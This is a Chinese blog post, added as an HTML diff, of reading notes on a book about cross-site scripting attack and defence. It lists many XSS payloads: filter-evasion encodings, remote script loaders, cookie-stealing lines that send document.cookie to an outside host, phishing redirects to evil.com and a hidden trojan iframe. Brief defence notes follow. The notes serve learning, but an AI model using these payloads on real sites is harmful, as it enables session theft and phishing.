@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="notwiner">
+    
+    <meta name="description" content="notwiner的小站,notwiner,博客,博客笔记">
+    
+    
+    
+    
+    
+    
+    <title>《XSS跨站脚本攻击剖析与防御》读书笔记 | notwiner</title>
+    <link href="http://www.notwiner.top" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://www.notwiner.top">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">notwiner</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/notes/">notes</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/program/">program</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/web/">web</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
+                        </li>
+                        
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/Burpsuite/">Burpsuite</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/Git/">Git</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/PHP/">PHP</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/sql/">sql</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/XSS/">XSS</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/hexo/">hexo</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://www.notwiner.top">notwiner</a>
+        >
+        <span>《XSS跨站脚本攻击剖析与防御》读书笔记</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">《XSS跨站脚本攻击剖析与防御》读书笔记</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/XSS/">XSS</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2020-08-05
+            </span>
+            
+			<span class="label label-gal">
+				<p id="busuanzi_value_page_pv" class="fa fa-eye"></p>
+            </span>
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">《XSS跨站脚本攻击剖析与防御》读书笔记</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2020-08-05
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/XSS/">XSS</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p><em>《XSS跨站脚本攻击剖析与防御》笔记，提醒!!!本笔记只是粗略笔记，如果希望学习，更推荐看原书!!!</em><span id="more"></span></p>
+<p>Shellcode：利用漏洞所执行的代码</p>
+<p>Exploit：完整的漏洞利用工具/程序</p>
+<p>POC：Proof of Concept缩写，证明漏洞存在的程序代码。</p>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&quot;&gt;</span><br><span class="line">&lt;iframe src=http://www.test.com width=0 height=0&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>get或者post均可，</p>
+<p>危害：</p>
+<ul>
+<li>钓鱼，盗取账号</li>
+<li>窃取cookie，获得隐私信息，或盗用用户身份对网站执行操作。</li>
+<li>劫持用户（浏览器）会话，执行任意操作。</li>
+<li>刷流量、强制广告</li>
+<li>网页挂马</li>
+<li>提升权限、传播跨站脚本蠕虫等等</li>
+</ul>
+<p>分类：</p>
+<ul>
+<li>反射型XSS（Reflected Cross-site Scripting）：又称非持久性跨站脚本，</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/search.php?key=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">http://www.test.com/login.asp?out=1&amp;url=javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure>
+<p>​    一般需要点击弹窗或链接来去触发，增加了攻击成本。</p>
+<ul>
+<li><p>存储型XSS（Stored Cross-site Scripting）：又称持久性跨站脚本。</p>
+<p>通过上传或存储到服务器中，用户浏览页面即可执行，多出现在留言、评论、博客等等交互位置。记得闭合<code>&lt;textarea&gt;</code>标签。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure>
+<p>​    常用来获得cookie、获取数据库等等。</p>
+<p><strong>Cheat Sheet</strong>：各种各样的XSS代码在不同浏览器、应用场景、环境的触发的可能列表。</p>
+<p>推荐几个github的</p>
+<p>[ 1 ]：<a target="_blank" rel="noopener" href="https://github.com/caomulaodao/XSS-Filter-Evasion-Cheat-Sheet-CN">XSS Filter Evasion Cheat Sheet 中文版</a></p>
+<p>[ 2 ]：<a target="_blank" rel="noopener" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser&#39;s-XSS-Filter-Bypass-Cheat-Sheet">Browser’s XSS Filter Bypass Cheat Sheet</a>，（建议谷歌翻译与原文对照食用）</p>
+<p>还有很多，建议github搜索相关关键词学习总结。</p>
+<p>XSS Expliot构造：</p>
+<ol>
+<li><p>绕过XSS-Filter：</p>
+<p>XSS-Filter：基于黑白名单的安全过滤策略进行过滤、编码等操作。</p>
+<ul>
+<li><p>&lt;&gt;的使用：<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>。</p>
+</li>
+<li><p>HTML标签属性值：利用<code>javascript:[code]</code>伪协议。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>测试可用<code>href=、lowscr=、background=、value=、action=</code>等等。</p>
+</li>
+<li><p>空格回车Tab：注意有<code>Tab</code>键、回车、空格额等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:alert(/xss/)&quot; width=100&gt;</span><br><span class="line">&lt;var a</span><br><span class="line">= &#x27;hello world&#x27;;</span><br><span class="line">alert(a);</span><br><span class="line">//遇到分号或发现语句完整才会结束。</span><br><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(/xss/)&quot; width=100&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对属性值转码：如ASCII，还可以插入空格、换行符的ASCII编码。<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/cencode.html">ASCII编码</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascrip&amp;#116;&amp;#58;alert(/xss/);&quot;&gt;</span><br><span class="line">//&amp;#116为t，&amp;#58为:</span><br><span class="line">&lt;img	src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">&lt;body onload=&#x27;vbs:execScript&quot;alert(0)&quot;,&quot;&amp;#x6a;avascript&quot;&#x27;&gt;</span><br><span class="line">&lt;img src=&quot;&amp;#01;javascript:alert(/a/)&quot;&gt;</span><br><span class="line">&lt;img src=&quot;java&amp;#09;scr&amp;#10;ipt:alert(/a/)&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建事件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;click me&quot; onclick=&quot;alert(&#x27;click me&#x27;)&quot; /&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用CSS跨站解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">&lt;div style=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line">&lt;img src=&quot;	javascript:alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>更为巧妙的运用，<code>link</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//更巧妙的运用，地址为test.com/index.css</span><br><span class="line">p &#123;</span><br><span class="line">background-image: expression(alert(&quot;XSS&quot;));</span><br><span class="line">&#125;</span><br><span class="line">//与目标网站</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;http://www.test.com/index.css&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><code>@import</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&#x27;text/css&#x27;&gt;@import url(http://www.evil.com/xss.css);&lt;/style&gt;</span><br><span class="line">自身网站内容为</span><br><span class="line">.showCSS&#123;</span><br><span class="line">event:expression(</span><br><span class="line">onload = function()</span><br><span class="line">&#123;</span><br><span class="line">alert(&#x27;XSS&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>@import的直接引用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">	@import &#x27;javascript:alert(&quot;XSS&quot;)&#x27;;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>扰乱过滤规则：</p>
+<ul>
+<li>大小写：<code>&lt;IMG SRC=&quot;javascript:alert(0);&quot;&gt;</code></li>
+<li>大小写混淆：<code>&lt;iMg sRc=&quot;jaVasCript:alert(0);&quot;&gt;</code></li>
+<li>单引号：<code>img src=&#39;javascript:alert(0);&#39;&gt;</code></li>
+<li>不用引号：<code>&lt;img src=javascript:alert(0);&gt;</code></li>
+<li>全角符号的扰乱：<code>&lt;div style=&quot;｛left:expression（alert(&#39;xss&#39;)）｝&quot;&gt;</code>。</li>
+<li>注释：<code>&lt;div style=&quot;wid/****/th:expre/*XSS*/ssion(alert(&#39;XSS&#39;));&quot;&gt;</code>。</li>
+<li><code>\</code>与<code>\0</code>等被浏览器忽略的字符：<code>@\0im\port&#39;\0ja\vasc\ript:alert(&quot;xss&quot;)&#39;;</code></li>
+<li>转码：<code>&lt;p style=&quot;xss:\65xpression(alert(/XSS/))&quot;&gt;</code>。e与<code>\65</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>字符编码：对属性值进行<code>&amp;#;</code>ASCII编码，或者添0变为<code>&amp;#0xx;</code>之类，或者使用十六进制等其他进制。或者使用javascript的<code>evil()、String.fromCharCode()</code>函数进行转换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//&lt;img src=&quot;javascript:eval(alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,41))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>类似的，引入其他文件地址，url(<a target="_blank" rel="noopener" href="http://test.com)也可以进行编码。编码方法包括JScript">http://test.com)也可以进行编码。编码方法包括JScript</a> Encode、VBScript Encode、unicode、escapes、进制等等。</p>
+</li>
+<li><p>拆分跨站法：对于有输入字符限制的，可以使用拆分用变量不断构造，最后输出即可。（和缓冲区溢出的shellcode类似）</p>
+</li>
+</ol>
+<p>Shellcode调用</p>
+<ol>
+<li><p>动态调用远程JavaScript：</p>
+<p>例如Exploit位置在<code>http://www.test.com/view.php?sort=[Expliot]</code>，为了方便利用通过<code>&lt;script&gt;</code>动态加载。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/view.php?sort=&quot;&gt;&lt;script src=http://www.exploit.com/xss.js&gt;&lt;/script&gt;&lt;http://www.bug.com/view.php?sort=&quot;&gt;&lt;script src=http://www.exploit.com/xss.js&gt;&lt;/script&gt;&lt;</span><br></pre></td></tr></table></figure>
+<p>还能基于DOM创建和输入节点，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a=document.createElement(&quot;script&quot;);</span><br><span class="line">a.src=&quot;http://www.test.com/xss.js&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(s);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用window.location.hash</p>
+<p>window.location.hash属性也可以解决长度问题，本身是用来获取和设置页面标签值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/view.php?sort=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>XSS Downloader：事先写入到网站某个页面，再利用XMLHTTP控件发送HTTP请求然后执行返回即可。需要XMLHTTP技术基础。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function XSS()&#123;</span><br><span class="line">a=new ActiveXObject(&#x27;Microsoft.XMLHTTP&#x27;);</span><br><span class="line">a.Open(&#x27;get&#x27;,&#x27;http://www.test.com/123.html&#x27;,false);/</span><br><span class="line">a.send();</span><br><span class="line">b=a.responseText;</span><br><span class="line">eval(unescape(b.substring(b.indexOf(&#x27;BOF|&#x27;)+4,b.indexOf(&#x27;|EOF&#x27;))));</span><br><span class="line">&#125;</span><br><span class="line">XSS();</span><br><span class="line">//http:www.test.com/123.html写入Shellcode</span><br><span class="line">Xx09abcxddxBOF|alert(/XSS/)|EOFxxx44xx1212</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>备选存储技术：cookie存储有缺点，在于容量有限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function setShellCode(codz)&#123;</span><br><span class="line">var exp=new Date();</span><br><span class="line">exp.setTime(exp.getTime()+365*24*60*60*1000);</span><br><span class="line">document.cookie=&#x27;shellcode=&#x27;+escape(codz)+&#x27;;&#x27;+&#x27;expires=&#x27;+exp.toGMTString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还有是存储容器Flash共享对象（Shared Object,SO），被称为Flash Cookie，</p>
+<p>此外还有IE的UserData存储XSS Shellcode和HTML5的localStorage、sessionStorage。如<code>window.localStorage.a</code>，</p>
+</li>
+</ol>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>cookie窃取</strong></p>
+<p>cookie分为持久性和临时性，临时性又称为会话cookie，存储在内存中，关闭浏览器立即消失，持久性存储硬盘中，由浏览器读取。浏览器通过<code>document.cookie</code>可以获取cookie信息。</p>
+<p>常见属性：Domain（关联域名）、Expires（过期时间）、HttpOnly（避免被JavaScript访问）、Name（名称）、Path（关联路径）、Value（读写值）、Secure（指定Cookie通过安全Socket层连接传递）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.location=&quot;http://www.test.com/cookie.asp?cookie=&quot;+document.cookie</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;http://www.test.com/cookie.asp?cookie=&quot;+document.cookie;&gt;&lt;/img&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&#x27;&lt;img src=&quot;http://www.test.com/cookie.asp?cookie=&#x27;+document.cookie+&#x27;&quot;width=0 height=0 border=0 /&gt;&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>会话劫持剖析</strong></p>
+<p>Session也就是会话，是一种安全的认证方式，和Cookie区别在于Session保存在服务端内存里。</p>
+<p><strong>网络钓鱼（Phishing）</strong></p>
+<p>首先在表单、留言框更改值使之链接到你的接受平台，如<code>&lt;form&gt;</code>标签的<code>action</code>属性值为<code>xxx.com/get.php</code>，然后在<code>xx.com</code>下存放接受信息的脚本<code>get.php</code>，在XSS页面创建iframe框架覆盖页面，等到用户点击即可。.</p>
+<p>钓鱼方式：</p>
+<ul>
+<li>XSS重定向钓鱼（XSS Redirect Phishing）：如<code>http://www.test.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://evil.com&quot;&lt;/script&gt;</code></li>
+<li>HTML注入式钓鱼（XSS HTML Inject Phishing）：通过反射型XSS注入HTML页面到网页。</li>
+<li>XSS跨框架钓鱼（Iframe Phishing）：利用iframe框架构造一个页面。</li>
+<li>Flash钓鱼（Flash Phishing）：通过<code>&lt;object&gt;</code>或<code>&lt;embed&gt;</code>标签引用外部服务器的Flash即可。</li>
+</ul>
+<p>更高级的：窃取Cookie，但是可以通过设置<code>Cookie</code>为<code>Httponly</code>来避免危害。如劫持<code>onclick、onkeydown、keycode</code>等等。</p>
+<p><strong>XSS History Hack</strong>：常用来获取用户浏览器的历史记录。</p>
+<ul>
+<li>链接样式和getComputedStyle()：CSS伪类定义链接样式，<code>JavaScript/CSS history hack</code>利用<code>getComputedSryle()</code>方法实现。</li>
+<li>JavaScript/CSS history hack：先获取CSS伪类定义颜色，然后通过链接的站点颜色与之对比。也可以参考<a target="_blank" rel="noopener" href="http://ha.ckers.org/weird/CSS-history.cgi">国外研究人员Rsnake的POC</a></li>
+<li>窃取搜索查询：和<code>JavaScript/CSS history hack</code>类似，记录用户可能访问的网站，通过js遍历列表链接属性，从而辨别浏览器是否访问过URL，而查询后的URL可以通过搜索的地址栏截获。                                             </li>
+</ul>
+<p><strong>客户端信息刺探</strong></p>
+<ul>
+<li>JavaScript端口扫描</li>
+<li>截获剪贴板内容：利用<code>window.clipboardData</code>对象处理剪贴板。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clearData(sDataFormat)		//删除剪贴板指定格式数据</span><br><span class="line">getData(sDataFormat)		//从剪贴板获取指定格式的数据</span><br><span class="line">setData(sDataFormat, sData)	//给剪贴板赋予指定格式数据</span><br></pre></td></tr></table></figure>
+<ul>
+<li>获取客户端IP地址</li>
+</ul>
+<p><strong>网页挂马</strong>：如<code>&lt;iframe&gt;</code>标签：<code>&lt;iframe src=http://www.evil.com/trojan.html width=0 height=0&gt;&lt;/iframe&gt;</code>，</p>
+<p><strong>DOS和DDOS</strong>：Denial of Service和Distributed Denial of Service。</p>
+<p><strong>XSS Virus/Worm</strong>：</p>
+<p><strong>工具</strong>：Firebug、Tamper Data、Live HTTP Headers、Fiddler、XSS-Proxy、XSS shell、AttackAPI、Anehta。</p>
+<h2 id="漏洞剖析"><a href="#漏洞剖析" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h2><ul>
+<li>黑盒测试（Blackbox）：其中又分为人工测试和自动化测试，自动化测试多称为扫描器，手动测试如<code>&lt;script&gt;alert(0)&lt;/script&gt;</code>，手动测试可以先输入敏感字符<code>&lt;、&gt;、&quot;、&#39;、&amp;、#</code>之类，然后通过js、onfocus事件等等方法测试。</li>
+<li>白盒测试（Whitebox）：白盒测试更多在于源代码审计，常规思路是：查询页面可能输出的变量，检验他们是否受到控制，然后跟踪变量传递过程，分析是否可能被函数过滤危险符号。</li>
+</ul>
+<p>JavaScript代码分析：DOM-Based XSS基于DOM，算是第三种跨站脚本漏洞。通过js的<code>document.write()</code>传递参数出现漏洞，</p>
+<p>Flash XSS</p>
+<p>语言特性：</p>
+<ul>
+<li>PHP4 phpinfo() XSS：<code>http://localhost/phpinfo?a[]=&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code></li>
+<li><code>$_SERVER[PHP_SELF]</code>：全局变量，可以通过提交查询代码修改值，<code>http://localhost/data.php/%22%3E%3Cscript%3Ealert(&#39;XSS&#39;)%3C/script%3E%3Cfoo</code>，除此之外，<code>SCRIPT_URL、QUERY_STRING</code>等等也有问题。</li>
+<li>变量覆盖：<code>register_global、extract()、遍历初始化变量</code></li>
+</ul>
+<h2 id="XSS-Worm剖析"><a href="#XSS-Worm剖析" class="headerlink" title="XSS Worm剖析"></a>XSS Worm剖析</h2><p>Ajax（Asynchronous JavaScript and XML）学习：XMLHttpRequest对象、HTTP请求、HTTP响应、</p>
+<p>浏览器安全：沙箱（Sandbox）、同源安全策略（Same Origin Policy）（同协议、同域名、同端口）。</p>
+<p>基本攻击流程：存在XSS漏洞，编写XSS Worm，当其他用户登录访问源头时候，感染，否则就跳过。一般XSS漏洞点在个人档案、博客日志、留言等地方，在攻击成功后，可以通过抓包工具进行收集XSS Worm数据。</p>
+<p>FLASH安全，（Flash虽然不被支持时间一再推迟，但退出是迟早的事情，不再记录）</p>
+<h2 id="深入浅出XSS原理"><a href="#深入浅出XSS原理" class="headerlink" title="深入浅出XSS原理"></a>深入浅出XSS原理</h2><p><strong>CSRF（Cross-Site Request Forgery）</strong>：跨站请求伪造，受害者登录网站并生成了Cookie，点击恶意链接或者第三方网站，攻击者通过恶意代码发送请求。常见如：<code>&lt;img&gt;、&lt;script&gt;、&lt;iframe&gt;、JS的Image对象、XMLHTTP对象</code>。</p>
+<p><strong>Hacking JSON</strong>：JSON（JavaScript Object Notation），JSON Hijacking（JavaScript Hijacking），</p>
+<p><strong>HTTP Response Splitting</strong>：分割HTTP响应头的方法，又称为CRLF注射攻击（CRLF Injection Attack），基础（HTTP Header）</p>
+<p>MHTML、Data URI XSS、UTF-7 BOM XSS、浏览器插件安全、基于Cookie的XSS、RSS的XSS、软件的XSS、浏览器差异、字符集编码隐患。</p>
+<p><strong>防御XSS</strong>：</p>
+<ul>
+<li>XSS Filter：输入过滤（输入验证、数据消毒）、输出编码（实体编码转换）、黑名单与白名单。</li>
+<li>定制过滤策略</li>
+<li>安全编码规范：</li>
+<li><p>防御DOM-Based XSS</p>
+</li>
+<li><p>其他：Anti_XSS（Microsoft Anti-Cross Site Scripting Library）、HttpOnly Cookie、Noscript、WAF</p>
+</li>
+</ul>
+<p><strong>防御CSRF</strong>：POST代替GET、HTTP Referer、验证码、token</p>
+<p>测试：xss常规符号，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;div&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;1</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[ 1 ]:邱永华 XSS跨站脚本攻击剖析与防御</p>
+
+    </div>
+</article>
+
+
